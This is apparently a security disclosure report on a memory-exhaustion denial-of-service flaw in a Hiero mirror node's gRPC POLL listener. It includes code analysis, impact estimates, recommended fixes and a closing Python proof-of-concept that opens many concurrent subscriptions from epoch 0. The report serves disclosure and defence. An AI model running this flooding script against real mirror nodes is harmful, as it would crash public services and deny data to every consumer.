### Title
Unbounded Per-Subscription Heap Allocation in `PollingTopicListener.poll()` Enables Memory Exhaustion via Concurrent Subscriptions

### Summary
When the gRPC listener is configured in `POLL` mode, each subscription independently calls `PollingTopicListener.poll()` every 500 ms, which materializes up to 5,000 `TopicMessage` objects fully into heap via `getResultList()` before wrapping them in a `Flux`. There is no global cap on the number of concurrent subscriptions, and the only per-connection limit (5 calls/connection) is trivially bypassed by opening many connections. An unauthenticated attacker can exhaust JVM heap and crash the mirror node process.

### Finding Description

**Exact code path:**

`PollingTopicListener.poll()` (lines 51–61) computes `pageSize = Math.min(Integer.MAX_VALUE, 5000)` when no limit is set, builds a new filter with `limit=5000`, and calls:

```java
return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
``` [1](#0-0) 

`TopicMessageRepositoryCustomImpl.findByFilter()` (line 60) does **not** use a cursor or lazy stream. It calls `getResultList()`, which fully materializes all matching rows into a `java.util.List<TopicMessage>` in heap, then wraps it as a `Stream`:

```java
return typedQuery.getResultList().stream(); // getResultStream()'s cursor doesn't work with reactive streams
``` [2](#0-1) 

**Root cause:** The assumption that `Flux.fromStream()` provides lazy/streaming semantics is broken because the underlying `Stream` is backed by an already-fully-loaded `List`. Every poll cycle per subscription allocates a full page of up to 5,000 objects on the heap simultaneously.

**Why existing checks fail:**

1. `maxConcurrentCallsPerConnection = 5` limits calls *per TCP connection*, not globally. An attacker opens N connections × 5 subscriptions = 5N total subscriptions with no server-side total cap. [3](#0-2) 

2. `TopicMessageFilter.isValidStartTime()` only requires `startTime <= DomainUtils.now()`. Epoch 0 (year 1970) is fully valid, guaranteeing the maximum number of historical messages is returned on every poll. [4](#0-3) 

3. `TopicMessageServiceImpl` tracks `subscriberCount` only as a metrics gauge — it is never used to reject new subscriptions. [5](#0-4) 

4. No authentication is required to call the gRPC `subscribeTopic` endpoint.

**Precondition:** The listener type must be set to `POLL` (`hiero.mirror.grpc.listener.type=POLL`). The default is `REDIS`, but `POLL` is a documented and supported configuration. [6](#0-5) 

### Impact Explanation

Each subscription in POLL mode allocates up to 5,000 `TopicMessage` objects (~200–500 bytes each) per 500 ms poll cycle. With 1,000 concurrent subscriptions (200 connections × 5 calls each), the steady-state heap pressure is approximately **1,000 × 5,000 × ~400 bytes = ~2 GB** allocated every 500 ms. This triggers `OutOfMemoryError`, crashing the JVM process and taking the mirror node gRPC API offline entirely — a complete denial of service for all consumers of HCS topic data. [7](#0-6) 

### Likelihood Explanation

The attack requires no credentials, no special protocol knowledge beyond standard gRPC, and no prior access. The gRPC port (5600) is publicly exposed. Opening hundreds of HTTP/2 connections and issuing 5 streaming RPCs per connection is trivially scriptable with any gRPC client library. The attack is repeatable and can be sustained indefinitely. The only barrier is that the operator must have chosen `POLL` mode over the default `REDIS` mode, which reduces the exposed population but does not eliminate it. [8](#0-7) 

### Recommendation

1. **Add a global concurrent subscription limit** in `TopicMessageServiceImpl.subscribeTopic()`: reject new subscriptions when `subscriberCount` exceeds a configurable threshold, returning `RESOURCE_EXHAUSTED`.

2. **Replace `getResultList().stream()` with a true cursor/scroll**: Use `getResultStream()` with a Hibernate `ScrollableResults` or Spring Data's `Stream<T>` with `@QueryHints` for `FORWARD_ONLY` / `READ_ONLY` scroll, so objects are not all materialized simultaneously. [9](#0-8) 

3. **Enforce a global `maxConnections` limit** on the Netty server builder (e.g., `serverBuilder.maxConnectionAge(...)` and a total connection count interceptor).

4. **Enforce a minimum `startTime`** (e.g., no more than N days in the past) to bound the result set size for historical catch-up subscriptions.

### Proof of Concept

```python
import grpc
import threading
from com.hedera.mirror.api.proto import consensus_pb2, consensus_pb2_grpc

TARGET = "mirror-node-grpc:5600"
TOPIC_ID = "0.0.12345"   # any high-volume topic
CONNECTIONS = 200
CALLS_PER_CONN = 5        # matches maxConcurrentCallsPerConnection default

def subscribe(stub):
    req = consensus_pb2.ConsensusTopicQuery(
        topicID=...,
        consensusStartTime=0,   # epoch 0 — valid per isValidStartTime()
        # no limit set → pageSize = maxPageSize = 5000 per poll
    )
    for _ in stub.subscribeTopic(req):
        pass  # consume slowly to keep subscription alive

threads = []
for _ in range(CONNECTIONS):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_pb2_grpc.ConsensusServiceStub(channel)
    for _ in range(CALLS_PER_CONN):
        t = threading.Thread(target=subscribe, args=(stub,))
        t.start()
        threads.append(t)

# Result: 1000 concurrent subscriptions each polling 5000 objects/500ms
# → OOM / JVM crash within seconds on a high-volume topic
```
